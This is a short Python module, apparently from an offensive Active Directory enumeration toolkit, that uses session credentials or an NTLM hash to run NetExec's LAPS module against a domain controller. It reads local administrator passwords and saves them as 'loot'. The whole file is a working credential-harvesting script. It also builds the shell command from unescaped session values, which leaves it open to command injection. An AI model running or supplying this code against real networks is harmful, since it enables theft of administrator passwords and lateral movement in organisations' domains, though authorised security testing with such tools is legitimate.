# modules/enum/laps.py

from core.helpers import run_command, save_loot
from core.colors import blue, green, red, yellow


def enum_laps(session, save=False):
    print(blue("[*] Checking for LAPS deployment and readable passwords..."))
    try:
        if session.hash:
            cred = f"-H {session.hash}"
        elif session.password:
            cred = f"-p '{session.password}'"
        else:
            print(red("[-] No credentials in session."))
            return

        cmd = (
            f"nxc ldap {session.dc_ip} -u {session.username} "
            f"{cred} -d {session.domain} --module laps"
        )
        out, err = run_command(cmd)
        combined = out + err
        print(combined)
        if save:
            save_loot("laps_enum.txt", combined)
    except Exception as e:
        print(red(f"[!] LAPS enumeration failed: {e}"))
